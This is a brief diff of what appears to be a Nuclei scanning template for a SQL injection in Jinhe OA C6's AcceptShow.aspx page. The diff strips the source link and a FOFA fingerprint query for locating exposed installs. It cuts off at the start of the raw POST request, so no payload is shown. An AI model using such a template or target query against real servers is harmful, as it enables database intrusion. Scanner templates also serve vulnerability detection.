@@ -3,12 +3,8 @@ info:
   name: 金和OA C6 AcceptShow.aspx 存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ggxmbril4mv13pkw'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ggxmbril4mv13pkw
-    fofa: body="JHSoft.Web.AddMenu" || app="金和网络-金和OA"
 http:
 - raw:
   - 'POST /c6/Jhsoft.Web.accept/AcceptShow.aspx/ HTTP/1.1
